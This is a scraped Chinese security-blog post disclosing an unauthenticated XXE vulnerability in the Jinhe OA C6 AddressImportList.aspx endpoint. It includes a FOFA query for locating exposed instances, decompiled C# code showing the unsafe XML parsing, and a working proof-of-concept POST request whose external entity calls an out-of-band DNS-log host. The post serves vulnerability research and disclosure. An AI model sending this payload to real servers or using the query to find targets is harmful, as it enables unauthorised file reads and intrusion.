---
title: "金和OA AddressImportList.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-AddressImportList-xxe.html
asset_dir: assets/金和oa-addressimportlist.aspx-xxe漏洞
---

# 金和OA AddressImportList.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/19 13:09
* 547浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

安全研究报告

编程语言教程

云安全解决方案


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AddressImportList.aspx` 接口处存在[XXE漏洞](https://mrxn.net/tag/XXE)，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `AddressImportList.aspx` 在 `bin` 目录下查找 `JHSoft.Web.AddressBook.dll` 将其进行反编译后找到 **AddressImportList** 的处理逻辑

```
public class AddressImportList : PageBase
{
  protected void Page_Load(object sender, EventArgs e)
  {
    if (((Control) this).Page.IsPostBack)
      return;
    ((Control) this).Context.Response.Write(this.GetXmlInfoAndSave());
  }
```

跟进 `GetXmlInfoAndSave` 方法

深入探索

服务器安全服务

数据库

防火墙软件

```
private string GetXmlInfoAndSave()
{
  string str1 = string.Empty;
  string str2 = string.Empty;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.addressbook/AddressImportList.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA AddressImportList.aspx XXE漏洞](images/img-001-d8ab722b3fc5.webp)](https://image.mrxn.net/a41ccba0c8f64f15b64d48d319931362.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA AddressImportList.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-AddressImportList-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-AddressImportList-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AddressImportList-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AddressImportList-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 